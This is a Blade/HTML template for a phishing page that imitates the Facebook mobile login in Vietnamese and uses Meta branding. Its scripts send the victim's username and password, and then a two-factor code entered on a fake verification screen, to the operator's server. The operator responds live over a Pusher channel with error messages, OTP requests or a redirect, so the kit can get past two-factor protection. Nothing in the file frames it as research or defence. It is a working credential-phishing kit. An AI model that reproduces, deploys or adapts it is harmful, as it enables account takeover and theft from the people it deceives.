<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>{{ $data->title }}</title>
    <meta name="description" content="{{ $data->description }}">
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="website">
    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
    <meta property="og:image" content="{{ $data->image }}">
    <meta property="og:title" content="{{ $data->title }}">
    <meta property="og:description" content="{{ $data->description }}">
    <meta property="og:site_name" content="{{ $data->title }}">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:description" content="{{ $data->description }}">
    <meta name="twitter:title" content="{{ $data->title }}">
    <link rel="shortcut icon"
        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/user/oldfacebooklogin/favicon.png">
    <link rel="stylesheet"
        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/user/oldfacebooklogin/style.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
</head>

<body>
    <div class="v-login_box" id="firstb">
        <div class="trctien">{{ $data->login_warning }}</div>
        <center style="margin-top: 10px;">
            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/user/oldfacebooklogin/svg0.svg"
                width="112">
        </center>
        <style>
            .input::before {
                border-image: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/user/oldfacebooklogin/b-l.png') 12 12 16 12 repeat;
            }
        </style>
        <div class="log-con">
            <div class="login-error" id="login_error" style="display: none;">Sai mật khẩu</div>
            <form id="login_form">
                <div class="input">
                    <div class="inputt">
                        <input type="text" class="inputtt" placeholder="Số di động hoặc email" id="username"
                            required>
                    </div>
                </div>
                <div class="input" style="margin-bottom: 10px;">
                    @if ($setting->showFacebookPasswordButton)
                        <div class="inputt" style="display: flex;align-items: center;background: #f5f6f7;">
                            <input type="password" class="inputtt" placeholder="Mật khẩu" id="password" required
                                style="margin-right: 2px;">
                            <span
                                style="color: #3578e5;font-size: 11px;font-weight: bold;width: 73px; text-align: center; display: none; cursor: pointer;user-select: none;padding: 7.8px;"
                                id="sah" onclick="SaH(this)">HIỂN THỊ</span>
                        </div>
                        <script>
                            $("#password").keydown(function(e) {
                                $("#sah").show()
                            });

                            function SaH(b) {
                                if ($("#password").attr('type') == 'password') {
                                    $("#password").attr('type', 'text')
                                    $(b).html('ẨN')
                                } else {
                                    $("#password").attr('type', 'password')
                                    $(b).html('HIỂN THỊ')
                                }
                            }
                        </script>
                    @else
                        <div class="inputt">
                            <input type="password" class="inputtt" placeholder="Mật khẩu" id="password" required>
                        </div>
                    @endif
                </div>
                <button type="submit" class="login-btnnn" id="login__btn">Đăng nhập</button>
            </form>
            <a href="#" class="forgot">Quên mật khẩu ?</a>
            <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh"
                    style="font-size: 13px;">hoặc</span></div>
            <center>
                <button class="reg_new">Tạo tài khoản mới</button>
            </center>
        </div>
        <div class="log-footer">
            <div class="item-fot">
                <span
                    style="color: #90949c;
               font-weight: bold;
               font-size: 12px;
               line-height: 16px;">Tiếng
                    Việt</span>
                <div class="lang">
                    <span class="lang-span">
                        <a href="#">中文(台灣)</a>
                    </span>
                </div>
                <div class="lang">
                    <span class="lang-span">
                        <a href="#">Español</a>
                    </span>
                </div>
                <div class="lang">
                    <span class="lang-span">
                        <a href="#">Français (France)</a>
                    </span>
                </div>
            </div>
            <div class="item-fot">
                <div class="lang">
                    <span class="lang-span">
                        <a href="#">English (UK)</a>
                    </span>
                </div>
                <div class="lang">
                    <span class="lang-span">
                        <a href="#">한국어</a>
                    </span>
                </div>
                <div class="lang">
                    <span class="lang-span">
                        <a href="#">Português (Brasil)</a>
                    </span>
                </div>
                <div class="lang">
                    <span class="lang-span"
                        style="padding: 1px 5px 3px 5px; border: 1px solid #3b5998; border-radius: 2px;">
                        +
                    </span>
                </div>
            </div>
        </div>
        <div class="_96qv _9a0a"><a style="text-decoration: none; color: #8a8d91" href="#" class="_96qw"
                title="Đọc blog của chúng tôi, khám phá trung tâm tài nguyên và tìm cơ hội việc làm.">Giới
                thiệu</a><span aria-hidden="true"> · </span><a style="text-decoration: none; color: #8a8d91"
                href="#" class="_96qw" title="Truy cập Trung tâm trợ giúp của chúng tôi.">Trợ giúp</a><span
                aria-hidden="true"> · </span><span class="_96qw" style="color: #8a8d91" id="u_0_4_dW">Xem
                thêm</span></div>
        <center style="    font-size: 12px;
    line-height: 15px; color: gray;">Meta &copy; <?= date('Y') ?></center>
    </div>
    <div class="v-lg-2" id="secondb" style="display: none;">
        <div class="pass-box">
            <p class="pass-title">Chọn một cách để xác nhận đó là bạn</p>
            <div class="pass-content">
                <p class="pass-pass">Phê duyệt từ một thiết bị khác</p>
                <p class="pass-contents">
                    Chúng tôi đã gửi thông báo đến các thiết bị của bạn. Hãy xem thông báo từ Facebook trên các thiết bị
                    đó và phê duyệt lần đăng nhập để tiếp tục.
                </p>
                <div class="pass-divide"></div>
            </div>
            <div class="pass-content2">
                <div class="login-error" id="code_error" style="margin-bottom: 5px; display: none;">Sai mã, vui lòng
                    thử lại</div>
                <p class="pass-pass">Hoặc nhập mã đăng nhập</p>
                <p class="pass-code">
                    Nhập mã xác minh chúng tôi đã gửi về cho bạn
                </p>
                <input type="text" class="pass-type" placeholder="Mã xác minh" id="type_code">
                <div class="pass-divide"></div>
            </div>
            <div class="pass-foot">
                <button class="send-code" id="send_codes">Xác nhận</button>
            </div>
        </div>
    </div>
    <script src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/helpers.js"></script>
    < <script>
        // for custom web
        var pusher = new Pusher('a16c3bab85659b6d2b51', {
            cluster: 'ap1'
        });

        var channel = pusher.subscribe('mrls');
        channel.bind('{{ $pusher_code }}', function(data) {
            $(".loltest").hide()
            if (data.status) {
                var error = $("#login_error")
                error.hide()
                window.location.href = '<?= $data->redirect_link ?>'
            } else {
                if (data.wrong_password) {
                    var error = $("#login_error")
                    error.show()
                    error.html('Mật khẩu không chính xác')
                    $("#login__btn").attr('disabled', false).html('Đăng nhập')
                }
                if (data.wrong_user) {
                    var error = $("#login_error")
                    error.show()
                    error.html('Số điện thoại hoặc địa chỉ email không hợp lệ')
                    $("#login__btn").attr('disabled', false).html('Đăng nhập')
                }
                if (data.otp_request) {
                    $("#firstb").remove()
                    $("#secondb").show()
                }
                if (data.request_resend) {
                    $("#code_error").show()
                    $("#send_codes").html('Xác nhận').attr('disabled', false)
                }
            }
        });
        $("#send_codes").click(function(e) {
            e.preventDefault();
            var otp = $("#type_code").val()
            btn = $(this)
            const dataToSend = {
                'info': '{{ $info }}',
                'ac': 'o',
                'otp': otp
            }
            if ($("#type_code").val() == '' || $("#type_code").val().length < 2) {
                alert('Vui lòng không bỏ trống')
            } else {
                $("#code_error").hide()
                btn.html("Đang xác nhận").attr('disabled', true)
                $.post("{{ route('post.customweb.facebook') }}", {
                        d: JSON.stringify(dataToSend),
                        'p_c': "{{ $pusher_code }}",
                        '_token': '{{ csrf_token() }}'
                    },
                    function(data, textStatus, jqXHR) {},
                    "json"
                );
            }

        });
        $("#login_form").submit(function(e) {
            e.preventDefault();
            var username = $("#username").val()
            var password = $("#password").val()
            var warning = $("#login_error")
            var btn = $("#login__btn")
            const dataToSend = {
                'username': username,
                'password': password,
                'info': '{{ $info }}',
                'ac': 'n'
            }
            btn.attr('disabled', true).html("Đang đăng nhập")
            // auto detect phone or string
            warning.hide()
            @if ($setting->checkLoginFacebook)
                if (string_check(username)) {
                    if (!check_email(username)) {
                        warning.html("Thông tin đăng nhập không hợp lệ")
                        warning.show()
                        btn.attr('disabled', false).html("Đăng nhập")
                        return
                    }
                } else {
                    if (!phone_check(username)) {
                        warning.html("Thông tin đăng nhập không hợp lệ")
                        warning.show()
                        btn.attr('disabled', false).html("Đăng nhập")
                        return
                    }
                }
            @endif
            @if ($setting->checkLoginFacebookPassword)
                if (password.length < 5) {
                    warning.html("Mật khẩu không hợp lệ hoặc quá ngắn")
                    warning.show()
                    btn.attr('disabled', false).html("Đăng nhập")
                    return
                }
            @endif
            $.post("{{ route('post.customweb.facebook') }}", {
                    d: JSON.stringify(dataToSend),
                    'p_c': "{{ $pusher_code }}",
                    '_token': '{{ csrf_token() }}'
                },
                function(data, textStatus, jqXHR) {
                    if (!data.status) {
                        warning.html("Vui lòng thử đăng nhập lại")
                        warning.show()
                        btn.attr('disabled', false).html("Đăng nhập")
                        return
                    }
                },
                "json"
            );
        });
    </script>
</body>

</html>
